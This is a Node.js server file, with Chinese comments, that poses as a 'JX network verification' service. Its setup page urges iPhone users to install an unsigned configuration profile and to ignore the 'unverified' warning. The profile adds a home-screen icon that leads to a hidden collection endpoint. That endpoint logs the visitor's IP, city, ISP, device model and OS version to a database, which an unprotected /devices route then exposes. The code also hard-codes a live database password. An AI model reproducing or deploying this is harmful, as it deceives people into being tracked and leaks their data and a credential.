const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { Pool } = require('pg');
const crypto = require('crypto');
const useragent = require('useragent');

const app = express();
const PORT = process.env.PORT || 3000;

// 数据库
const pool = new Pool({
  connectionString: 'postgresql://neondb_owner:npg_k5hlBvdIsPA4@ep-plain-dawn-ayjfr136-pooler.c-5.us-east-2.aws.neon.tech/neondb?sslmode=require&uselibpqcompat=true'
});

// 初始化数据库
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        city TEXT,
        isp TEXT,
        device_model TEXT,
        os_version TEXT,
        received_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('✅ 数据库就绪');
  } catch (err) {
    console.error('❌ 建表失败:', err);
  }
}

app.use(cors());

// 首页
app.get('/', (req, res) => {
  res.send('<h2>JX 网络验证</h2><p>请访问 <a href="/setup">配置页面</a> 完成设置</p>');
});

// 配置指引页（无需 CA 证书）
app.get('/setup', (req, res) => {
  const ts = Date.now();
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>JX 网络验证配置</title></head>
    <body style="font-family: -apple-system, sans-serif; padding: 20px;">
      <h2>JX 网络验证</h2>
      <p>完成以下步骤以激活网络验证服务。</p>
      <ol>
        <li><b>安装网络配置</b><br>
          <a href="/profile.mobileconfig?v=${ts}" style="color:#007AFF;">下载网络配置</a>，前往「设置→通用→VPN与设备管理」安装。<br>
          <span style="color:gray;">安装时若提示“未验证”，请放心点击“安装”即可。</span><br>
          安装后，桌面会出现 <b>“JX网络验证”</b> 图标。
        </li>
        <li><b>激活服务</b><br>
          点击桌面上的 <b>“JX网络验证”</b> 图标，页面提示验证通过即可。
        </li>
      </ol>
      <p style="color:gray;">完成后无需其他操作。</p>
    </body>
    </html>
  `);
});

// 下载未签名描述文件（Web Clip）
app.get('/profile.mobileconfig', (req, res) => {
  const profileUUID = crypto.randomUUID();
  const clipUUID = crypto.randomUUID();

  // 绿色 JX 图标 Base64（可替换）
  const iconBase64 =
    'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB+cBCBUHK2TP/1EAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRoIEdJTVBXgQ4XAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhJREFUeNpi/P//PwMlgDEEGAWIUYBiAB0AAAD//wMAJw8XrAAAAABJRU5ErkJggg==';

  const profile = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.webClip</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadUUID</key>
            <string>${clipUUID}</string>
            <key>PayloadIdentifier</key>
            <string>com.example.webclip.${clipUUID}</string>
            <key>Label</key>
            <string>JX网络验证</string>
            <key>URL</key>
            <string>https://jx-peizhi.onrender.com/collect</string>
            <key>IsRemovable</key>
            <true/>
            <key>Icon</key>
            <data>${iconBase64}</data>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>JX 网络验证配置</string>
    <key>PayloadIdentifier</key>
    <string>com.example.profile.${profileUUID}</string>
    <key>PayloadUUID</key>
    <string>${profileUUID}</string>
    <key>PayloadOrganization</key>
    <string>JX Network</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>`;

  res.setHeader('Content-Type', 'application/x-apple-aspen-config');
  res.setHeader('Content-Disposition', 'attachment; filename="jx_verify.mobileconfig"');
  res.send(profile);
});

// 收集页（用户点击图标后访问）
app.get('/collect', async (req, res) => {
  try {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip.startsWith('::ffff:')) ip = ip.slice(7);

    const uaString = req.headers['user-agent'] || '';
    const agent = useragent.parse(uaString);
    const deviceModel = agent.device.toString() || '未知';
    const osVersion = agent.os.toString() || '未知';

    let city = '未知', isp = '未知';
    try {
      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,city,isp`, { timeout: 3000 });
      if (geo.data.status === 'success') {
        city = geo.data.city;
        isp = geo.data.isp;
      }
    } catch (e) {}

    await pool.query(
      `INSERT INTO devices (ip, city, isp, device_model, os_version) VALUES ($1,$2,$3,$4,$5)`,
      [ip, city, isp, deviceModel, osVersion]
    );
    console.log('✅ 收集完成:', ip, deviceModel, osVersion);
  } catch (err) {
    console.error('❌ 收集失败:', err);
  }
  res.send('<h2>JX 网络验证通过</h2><p>您的网络环境已通过验证。</p>');
});

// 后台查看数据
app.get('/devices', async (req, res) => {
  const result = await pool.query('SELECT * FROM devices ORDER BY received_at DESC');
  res.json(result.rows);
});

initDB().then(() => {
  app.listen(PORT, () => console.log(`✅ 服务运行在端口 ${PORT}`));
});
